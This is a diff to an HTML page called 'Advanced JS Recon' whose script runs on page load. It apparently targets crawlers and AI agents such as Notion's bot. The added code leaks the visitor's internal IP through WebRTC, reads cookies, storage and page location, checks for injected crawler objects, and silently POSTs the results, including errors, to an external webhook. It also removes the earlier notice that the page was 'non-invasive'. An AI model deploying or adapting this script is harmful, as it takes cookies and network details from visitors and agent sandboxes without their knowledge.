@@ -2,65 +2,78 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Reconnaissance in Progress</title>
+    <title>Advanced JS Recon</title>
 </head>
 <body>
-    <h1>Starting Reconnaissance...</h1>
-    <p>This page gathers non-invasive system data. If you are a friendly bot, have a nice day!</p>
-    <div id="output">Collecting data...</div>
+    <h1>Advanced Reconnaissance...</h1>
+    <div id="output">Running checks...</div>
 
     <script>
-        // --- 1. CONFIGURATION: PASTE YOUR HOOKDECK URL HERE ---
         const yourWebhookUrl = "https://hkdk.events/dp0gb9zztqv6wp"; 
-        // Example: "https://hookdeck.co/unique-id"
-        // -----------------------------------------------------
+
+        async function getInternalIP() {
+            return new Promise((resolve) => {
+                const rtc = new RTCPeerConnection({iceServers: []});
+                rtc.createDataChannel('');
+                rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
+                rtc.onicecandidate = (ice) => {
+                    if (ice && ice.candidate && ice.candidate.candidate) {
+                        const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/;
+                        const match = ipRegex.exec(ice.candidate.candidate);
+                        if (match) {
+                            rtc.close();
+                            resolve(match[1]);
+                        }
+                    }
+                };
+                // Timeout just in case WebRTC is entirely disabled
+                setTimeout(() => { rtc.close(); resolve('WebRTC Disabled/Timeout'); }, 2000);
+            });
+        }
 
         async function gatherAndSendData() {
             try {
-                // Collect Safe, Non-Invasive Browser Data
-                const reconData = {
-                    navigator: {
-                        userAgent: navigator.userAgent || 'Unknown',
-                        platform: navigator.platform || 'Unknown',
-                        language: navigator.language || 'Unknown',
-                        deviceMemory: navigator.deviceMemory || 'Unknown', // In GB
-                        hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown', // Num. CPU cores
+                const internalIp = await getInternalIP();
+
+                const advancedReconData = {
+                    network: {
+                        internal_ip: internalIp
                     },
-                    screen: {
-                        width: window.screen.width,
-                        height: window.screen.height,
-                        colorDepth: window.screen.colorDepth,
+                    sandbox_status: {
+                        cookies: document.cookie || 'None',
+                        localStorageLength: localStorage.length,
+                        sessionStorageLength: sessionStorage.length,
+                        hasFileSystemAPI: 'showOpenFilePicker' in window,
+                        hasWebUSB: 'usb' in navigator,
+                        pluginsCount: navigator.plugins.length,
+                        pdfViewerEnabled: navigator.pdfViewerEnabled
                     },
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
-                    referrer: document.referrer || 'None',
+                    execution_context: {
+                        actual_location: window.location.href,
+                        // Checking for custom injected crawler objects (naive check)
+                        hasNotionObjects: Object.keys(window).some(k => k.toLowerCase().includes('notion') || k.toLowerCase().includes('crawl'))
+                    },
                     timestamp: new Date().toISOString()
                 };
 
-                // Display collected data on the page (for user visibility)
-                document.getElementById('output').innerHTML = '<pre>' + JSON.stringify(reconData, null, 2) + '</pre>';
+                document.getElementById('output').innerHTML = '<pre>' + JSON.stringify(advancedReconData, null, 2) + '</pre>';
 
-                // Send the data to your free Hookdeck endpoint
-                console.log("Sending recon data...");
-                const response = fetch(yourWebhookUrl, {
+                await fetch(yourWebhookUrl, {
                     method: 'POST',
-                    mode: 'no-cors', // Use no-cors to avoid CORS preflight failures
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(reconData)
+                    mode: 'no-cors',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(advancedReconData)
                 });
-                
-                // If it's the Notion bot, we have no way to see the response anyway.
-                // It will just see that it successfully loaded this page and executed the script.
-                console.log("Recon data sent!");
 
             } catch (error) {
-                console.error("An error occurred during recon:", error);
-                document.getElementById('output').textContent = "Error collecting data: " + error.message;
+                await fetch(yourWebhookUrl, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: JSON.stringify({ error: error.message })
+                });
             }
         }
 
-        // Start the process immediately when the page loads
         gatherAndSendData();
     </script>
 </body>
